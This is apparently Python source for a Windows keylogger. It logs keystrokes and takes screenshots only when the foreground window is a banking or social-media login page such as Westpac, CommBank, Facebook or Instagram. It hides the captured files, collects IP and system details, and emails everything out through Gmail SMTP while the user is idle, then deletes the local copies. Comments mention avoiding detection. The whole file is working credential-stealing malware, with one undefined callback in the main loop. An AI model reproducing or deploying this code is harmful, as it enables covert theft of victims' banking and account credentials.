import pynput
from pynput.keyboard import Key, Listener
from pynput import mouse
from ctypes import Structure, windll, c_uint, sizeof, byref
import pyscreenshot as ImageGrab
import logging, datetime, socket, os, requests, random, sys, platform
import win32gui, time, threading, smtplib, glob
from email import encoders
from email.message import EmailMessage
from os import path
import config
from config import *

# [+] PLEASE READ [+]
# Before running this program, please install the following via pip install: 
# image, pyscreenshot, pywin32, requests, pynput

# If testing this out on your own computer, please change the logs directory 
# where the log files will be stored and add in your gmail account details
# in config.py. Make sure your gmail account settings of 'access to less 
# secure apps' is switched on. Please use Google Chrome to test this out.
# Otherwise, change the login_sites to match your own website browser.

# The commented out print statements were used for testing out this program
# to make sure that it worked

# ...global variables... #

# path to store log file
# r string creates a raw string so the backslash is treated as
# a literal character
log_dir = r"C:/DIRECTORY WHERE YOUR LOG FILES AND SCREENSHOTS WILL BE SAVED"

# get the user's details 
# these will be used to initialise the log file
publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
machine = platform.machine()
system = platform.system() + " " + platform.version()
user = os.path.expanduser('~').split('\\')[2]
datetime = time.ctime(time.time())

message = f'Date and Time: {datetime} User: {user} Public IP: {publicIP} PrivateIP: {privateIP} System: {system} Machine: {machine} '

datetime = time.ctime(time.time())
logged_data = []
old_app = ''
num_screenshots = 0
now = time.time()
login_sites = {'Sign in to Westpac Live Online Banking - Google Chrome', 'Facebook – log in or sign up - Google Chrome', 'Login on Twitter / Twitter - Google Chrome', 'Sign up for Twitter / Twitter - Google Chrome', 'Sign up • Instagram - Google Chrome', 'Instagram - Google Chrome', 'Login • Instagram - Google Chrome', 'Personal banking including accounts, credit cards and home loans - CommBank - Google Chrome'}
website = ""
times = []

# ... Keylogger Functions... #

# log keystrokes to file
def on_press(key):
    global old_app, logged_data, website, times, message
    
    # show what application is being used
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if old_app == '':
        old_app = new_app
        website = f'Program Opened: {new_app}\n\n'
    # check when the program has been changed before writing into the log file
    # i.e. the target program was closed
    elif new_app != old_app:
        write_file(logged_data, message, website)
        old_app = new_app
    elif new_app == old_app:
        website = f'Program Opened: {new_app}\n\n'
   
    if new_app in login_sites:
        if  len(times) == 0:
            times.append(time.ctime(time.time()))
        elif key =='Key.enter':
            times.append(time.ctime(time.time()))
        # print("{0} pressed".format(key))
        logged_data.append(key)
    
    # print("======================") 
    # print("new app is", new_app) 
    # print("old app is", old_app)
    # print("======================") 

# log the keys to a file via appending mode
def write_file(keys, message, website):
    global logged_data, times

    if len(keys) == 0:
        return

    # if the file has the same name generated as one created, 
    # generate a new filename
    filename = str(random.randint(1000000, 9999999)) + '.txt'
    while path.exists(log_dir+filename):
        filename = str(random.randint(1000000, 9999999)) + '.txt'
    
    # write in the log file
    with open(log_dir+filename, "a") as f:
        f.write(message)
        f.write(website)
        f.write("\n" + '[' + times[0] + ']: ')
        index = 1
        for key in keys:
            key = str(key)
            # remove quotation marks
            if key == 'Key.enter':
                f.write("\n" + '[' + times[index] + ']: ')
                index += 1
            elif key == 'Key.space':
                f.write(" ")
            elif key.find("Key") == -1 and key.find("\\x") == -1:
                # log in only letters and numbers
                key = str(key)[1:-1]
                f.write(key)       
            elif key == 'Key.delete':
                f.write(" ~[DELETE]~ ")
            elif key == 'Key.backspace':
                f.write(" ~[BACKSPACE]~ ")
            elif key == 'Key.tab':
                f.write("   ")
       
        # email and delete files when finished writing
        f.close()
        logged_data = []
        times = []
    
    # make the log file hidden
    # M1: os.system( "attrib +h " + log_dir + filename)
    # M2: use os.popen instead of os.system so the terminal
    # does not become visible
    fn = log_dir + filename
    p = os.popen('attrib +h ' + fn)
    t = p.read()
    p.close()

# send an email of the log file and remove the log file from the system
def send_email():
    
    # no .txt files to send via email
    # therefore, stop the function
    count = 0
    os.chdir(log_dir)
    for file in glob.glob("*.txt"):
        count += 1
    if count == 0:
        return

    # get all the files from the folder, 'Logs'
    delete_file = []
    # r=root, d=directories, f = files
    for r, d, f in os.walk(log_dir):
        for file in f:
            delete_file.append(log_dir+file)

    # make the email message
    fromAddr, fromPswd = config.getDetails()
    toAddr = fromAddr

    msg = EmailMessage()
    msg['From'] = fromAddr
    msg['To'] = toAddr
    msg['Subject'] = "Log File"
    msg.set_content('New logs!')
    
    # add in attachments
    # close of the log does not need to be done, 
    # this is automatically done by itself
    for log in delete_file:
        with open(log,'rb') as f:
            try:
                file_data = f.read()
                msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename= log.replace(log_dir,''))
            except Exception as e:
                print("Could not read file | Error: {}".format(e))

    try:
        # start server
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        
        # Authentication
        s.login(fromAddr, fromPswd)

        # Converts the Multipart msg into a string
        message = msg.as_string()
        # print('test {}'.format(message))

        # sending the mail
        s.sendmail(fromAddr, toAddr, message)
        
        # quit server
        s.quit()
        # print('email sent successfully')
    except Exception as e:
        print('email failed to sent')
        print(e)
     
    # delete the log file and file objects
    for log in delete_file:
        os.remove(log)
    delete_file = []
    # print('The log file has been deleted')

# takes a screenshot of the whole screen
def screenshot():
    # takes a snapshot of the screen
    im = ImageGrab.grab()
    # save the file
    filename = str(random.randint(1000000, 9999999)) + '.png'
    im.save(log_dir+filename)
   
    # make file hidden
    # M1: os.system( "attrib +h " + log_dir + filename)
    # M2: use os.popen instead of os.system so the terminal does not become
    # visible
    fn = log_dir + filename
    p = os.popen('attrib +h ' + fn)
    t = p.read()
    p.close()
    

# CREDIT: 
# http://stackoverflow.com/questions/911856/detecting-idle-time-in-python
class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]

# get the duration that the user has kept the computer idle
def get_idle_duration():
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = sizeof(lastInputInfo)
    
    # get the last input info taken from the user
    # i.e. when the mouse is moved or when a key is pressed
    windll.user32.GetLastInputInfo(byref(lastInputInfo))
    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    return millis / 1000.0

# Gets the time the user has been inactive
# After 8 minutes, the keylogger emails out the log files and screenshots
# Runs the screenshots
def monitor_user_inactivity():
    while 1:
        # take a screenshot
        time_screenshot() 
        
        getLastInputInfo = int(get_idle_duration())
        # print(getLastInputInfo)
        
        # if the user has been idle for 9 minutes, email all the files in the
        # Logs folder. This is avoid delays which slows the computer making
        # the keylogger more detectable. If the user has been inactive for 10
        # seconds, the keylogger will email out and delete all logs
        if getLastInputInfo == 480:
            send_email()
        
# allow a screenshot to be taken every 10 seconds. 
# Only a maximum of 5 screenshots can be taken per website visited
# Only screenshot from websites from the login/sign up list
def time_screenshot():
    global now, num_screenshots, old_app
    
    future = now + 10
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    
    # reset the count for the number of screenshots taken
    if new_app != old_app:
        num_screenshots = 0

    # take a screenshot when on a login site 
    if new_app in login_sites:
        if time.time() >= future:
            now = time.time()
            # take a max of 3 screenshoots for each login website
            if num_screenshots < 3:
                # delay the first screenshot by a second
                if num_screenshots == 0:
                    time.sleep(1)
                screenshot()
                num_screenshots += 1

# constantly listen as a loop
if __name__=='__main__':
	T1 = threading.Thread(target=monitor_user_inactivity)
	T1.start()
        
	with Listener(on_press=on_press, on_release=on_release) as listener:
		listener.join()